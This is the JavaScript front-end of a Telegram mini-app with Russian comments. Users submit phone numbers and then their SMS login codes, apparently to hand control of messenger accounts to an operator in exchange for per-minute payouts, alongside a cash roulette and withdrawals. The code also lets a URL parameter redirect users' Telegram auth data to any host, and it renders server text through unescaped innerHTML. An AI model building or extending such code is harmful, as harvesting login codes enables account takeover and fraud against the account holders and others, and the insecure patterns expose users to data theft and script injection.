// script.js — без конфликтов имён, simple POST (text/plain), авто-пинг
;(function () {
  'use strict';

  // ====== API базовый URL ======
  const DEF = 'https://holiday-place-gdp-by.trycloudflare.com'; // дефолт
  const qs = new URLSearchParams(location.search);
  const API_BASE = (qs.get('api') || DEF).replace(/\/$/, '');

  // ====== Telegram WebApp ======
  const tg = window.Telegram?.WebApp; if (tg) tg.expand();
  const initData = tg?.initData || qs.get('initData') || '';
  const u = tg?.initDataUnsafe?.user || {};
  const USER_ID   = u.id || Number(qs.get('user_id')) || 1;
  const USERNAME  = u.username || u.first_name || qs.get('username') || 'user';

  // ====== helpers ======
  const byId = (id)=>document.getElementById(id);
  const qsa  = (s, r=document)=>Array.from(r.querySelectorAll(s));

  // Ripple для кнопок (красиво и дёшево)
  document.addEventListener('pointermove',(e)=>{
    const b = e.target?.closest('button'); if (!b) return;
    const r = b.getBoundingClientRect();
    b.style.setProperty('--rx',(e.clientX-r.left)+'px');
    b.style.setProperty('--ry',(e.clientY-r.top)+'px');
  });

  // Простые тосты (если есть контейнер)
  const notifyRoot = byId('notify-root');
  function toast(type, title, msg, ms=2500){
    if (!notifyRoot) return;
    const el = document.createElement('div');
    el.className = `notif ${type||'info'}`;
    el.innerHTML = `<div><div class="title">${title||'Сообщение'}</div><div class="msg">${msg||''}</div></div><button class="x">✕</button>`;
    notifyRoot.appendChild(el);
    const close=()=>el.remove(); el.querySelector('.x').onclick=close; setTimeout(close, ms);
  }

  // ====== HTTP: simple POST без preflight ======
  async function post(path, data={}){
    const url  = API_BASE + (path.startsWith('/') ? path : '/'+path);
    const body = initData ? { ...data, initData } : { ...data, user_id: USER_ID, username: USERNAME };
    const res  = await fetch(url, { method:'POST', headers:{'Content-Type':'text/plain;charset=UTF-8'}, body: JSON.stringify(body) });
    let js=null; try{ js=await res.json(); }catch{}
    if (!res.ok || !js || js.ok===false) throw new Error((js&&(js.error||js.message))||`HTTP ${res.status}`);
    return js;
  }

  // ====== Проверка доступности API ======
  async function ping(){
    try{
      const r = await fetch(API_BASE + '/api/ping', { method:'GET', cache:'no-store' });
      const j = await r.json();
      console.info('[PING OK]', API_BASE, j);
      return true;
    }catch(e){
      console.warn('[PING FAIL]', API_BASE, e);
      return false;
    }
  }
  async function checkApi(){
    const ok = await ping();
    if (!ok) { console.warn('[API FAIL] ping'); return false; }
    try{
      const r = await post('/api/bootstrap', {});
      console.info('[API OK] bootstrap →', r?.username || USERNAME);
      return true;
    }catch(e){
      console.warn('[API FAIL] bootstrap →', String(e.message||e));
      return false;
    }
  }
  window.checkApi = checkApi; // можно дернуть в консоли

  // ====== Навигация (минимум для проверки) ======
  const SCREENS = {
    menu: byId('menu'),
    stats: byId('screen-stats'),
    submit: byId('screen-submit'),
    report: byId('screen-report'),
    priv: byId('screen-priv'),
    roulette: byId('screen-roulette'),
    withdraw: byId('screen-withdraw'),
    contests: byId('screen-contests'),
  };
  function show(id){
    Object.values(SCREENS).forEach(el=>el&&el.classList.add('hidden'));
    (SCREENS[id]||SCREENS.menu)?.classList.remove('hidden');
  }
  qsa('#menu [data-screen]').forEach(b=>b.addEventListener('click',()=>{
    const s=b.getAttribute('data-screen'); show(s);
    if (s==='stats')   loadStats();
    if (s==='report')  loadReport();
    if (s==='priv')    loadPriv();
    if (s==='roulette')setupRouletteOnce();
    if (s==='contests')loadContests();
    if (s==='withdraw')refreshBalance();
  }));
  qsa('.back').forEach(b=>b.addEventListener('click',()=>show('menu')));

  // ====== Чат-лог ======
  const chatBox = byId('chat');
  function pushBubble(role, text, ts){
    if (!chatBox) return;
    const el = document.createElement('div');
    el.className = `bubble ${role==='admin'?'b-admin':role==='user'?'b-user':'b-system'}`;
    el.innerHTML = `${text}<div class="meta">${ts||''}</div>`;
    chatBox.appendChild(el);
    chatBox.scrollTop = chatBox.scrollHeight;
  }
  async function loadLogs(){
    try{
      const r = await post('/api/logs', {});
      if (chatBox) chatBox.innerHTML = '';
      (r.events||[]).forEach(e=>pushBubble(e.role, e.text, e.ts));
    }catch{}
  }

  // ====== Статистика ======
  async function loadStats(){
    const pre = byId('statsBox');
    try{ const r = await post('/api/stats', {}); pre&&(pre.textContent = JSON.stringify(r.stats||{}, null, 2)); }
    catch{ pre&&(pre.textContent = 'Ошибка загрузки статистики'); }
  }

  // ====== Сдача MAX ======
  let currentSubmissionId = 0;
  const phoneInput = byId('phone');
  const codePanel  = byId('codePanel');
  const codeInput  = byId('code');

  byId('sendPhone')?.addEventListener('click', async ()=>{
    const phone = (phoneInput?.value||'').trim();
    if (!phone) return toast('error','Номер','Введите номер телефона');
    try{
      const r = await post('/api/submit_phone', { phone });
      currentSubmissionId = r.submission_id||0;
      codePanel?.classList.remove('hidden');
      toast('success','Отправлено','Ждём код из SMS');
      loadLogs();
    }catch(e){ toast('error','Ошибка', String(e.message||e)); }
  });

  byId('sendCode')?.addEventListener('click', async ()=>{
    const code = (codeInput?.value||'').trim();
    if (!currentSubmissionId || !code) return toast('error','Код','Введите код из SMS');
    try{
      await post('/api/submit_code', { submission_id: currentSubmissionId, code });
      toast('success','Код принят','Ожидайте подтверждения');
      loadLogs();
    }catch(e){ toast('error','Ошибка', String(e.message||e)); }
  });

  // ====== Отчёт ======
  async function loadReport(){
    const box = byId('reportList'); if (!box) return; box.innerHTML='';
    try{
      const r = await post('/api/my_numbers', {});
      (r.rows||[]).forEach(row=>{
        const d=document.createElement('div'); d.className='contest-card';
        d.innerHTML = `
          <div class="contest-title">#${row.id} • ${row.phone||'—'}</div>
          <div class="contest-meta">
            <span>Статус: <b>${row.status}</b></span>
            <span>Минут: <b>${row.minutes}</b></span>
            <span>Начислено: <b>$${Number(row.earned||0).toFixed(2)}</b></span>
          </div>`;
        box.appendChild(d);
      });
    }catch{ box.textContent='Ошибка загрузки отчёта'; }
  }
  byId('reportRefresh')?.addEventListener('click', loadReport);

  // ====== Привилегии ======
  async function loadPriv(){
    const sum = byId('privSummary');
    try{
      const r = await post('/api/priv/info', {});
      const plan = r.plan?.plan || 'standard';
      const until= r.plan?.plan_until || '—';
      const rate = r.rate!=null ? `$${Number(r.rate).toFixed(2)}` : '—';
      sum&&(sum.textContent=`Тариф: ${plan} • Ставка: ${rate} • Действует до: ${until}`);
      const p = r.prices||{};
      byId('price-premium')&&(byId('price-premium').textContent=`$${p.premium||40}`);
      byId('price-speed')  &&(byId('price-speed').textContent  =`$${p.speed||30}`);
    }catch{ sum&&(sum.textContent='Ошибка загрузки тарифов'); }
  }
  byId('buy-premium')?.addEventListener('click', async ()=>{
    try{ await post('/api/priv/buy', {plan:'premium'}); toast('success','Тариф','Премиум активирован'); loadPriv(); }
    catch(e){ toast('error','Покупка', String(e.message||e)); }
  });
  byId('buy-speed')?.addEventListener('click', async ()=>{
    try{ await post('/api/priv/buy', {plan:'speed'}); toast('success','Тариф','Speed активирован'); loadPriv(); }
    catch(e){ toast('error','Покупка', String(e.message||e)); }
  });
  byId('std-activate')?.addEventListener('click', async ()=>{
    try{ await post('/api/priv/activate_standard', {}); toast('success','Стандарт','Возврат выполнен'); loadPriv(); }
    catch(e){ toast('error','Стандарт', String(e.message||e)); }
  });

  // ====== Рулетка ======
  const strip = byId('case-strip'); let rouletteReady=false;
  function setupRouletteOnce(){
    if (rouletteReady || !strip) return; rouletteReady=true;
    const items=[{t:'$0.10',i:'💠'},{t:'$0.20',i:'🪙'},{t:'$0.50',i:'💎'},{t:'$0.00',i:'❌'},{t:'$0.30',i:'🔹'},{t:'$0.70',i:'🔷'},{t:'$1.20',i:'⭐'},{t:'$0.95',i:'✨'}];
    for(let k=0;k<18;k++){ const it=items[k%items.length]; const tile=document.createElement('div'); tile.className='case-tile'; tile.innerHTML=`<div class="icon">${it.i}</div>${it.t}`; strip.appendChild(tile); }
  }
  async function spin(){
    try{
      const r = await post('/api/roulette_spin', {}); const win=Number(r.win||0);
      byId('ru-result')&&(byId('ru-result').textContent = `Выигрыш: $${win.toFixed(2)} • Баланс: $${Number(r.balance||0).toFixed(2)}`);
      const w = strip.scrollWidth; strip.style.transform='translateX(0)';
      const shift = -Math.floor(Math.random()*Math.max(1,w-300));
      strip.animate([{transform:'translateX(0px)'},{transform:`translateX(${shift}px)`}], {duration:900,easing:'cubic-bezier(.2,.8,.2,1)',fill:'forwards'});
      loadLogs();
    }catch(e){ toast('error','Рулетка', String(e.message||e)); }
  }
  byId('ru-spin')?.addEventListener('click', spin);

  // ====== Вывод средств ======
  async function refreshBalance(){
    try{ const r=await post('/api/stats',{}); const bal=Number(r.stats?.balance||0); byId('wdBalance')&&(byId('wdBalance').textContent=bal.toFixed(2)); }catch{}
  }
  byId('wdSend')?.addEventListener('click', async ()=>{
    const amt = Number(byId('wdAmount')?.value||0);
    if (!(amt>=5 && amt<=100)) return toast('error','Сумма','Допустимо 5–100$');
    try{ const r=await post('/api/withdraw_request', {amount:amt}); toast('success','Заявка создана', `ID ${r.payout_id}`); refreshBalance(); loadLogs(); }
    catch(e){ toast('error','Вывод', String(e.message||e)); }
  });
  byId('wdCancel')?.addEventListener('click', async ()=>{
    try{ const r=await post('/api/withdraw_cancel', {}); toast(r.ok?'success':'error', r.ok?'Отменено':'Ошибка', r.ok?'Заявка отменена':'Нет активной заявки'); refreshBalance(); loadLogs(); }
    catch(e){ toast('error','Отмена', String(e.message||e)); }
  });

  // ====== Старт ======
  (async function init(){
    show('menu');
    await checkApi();
    await loadStats();
    await loadLogs();
  })();
})();
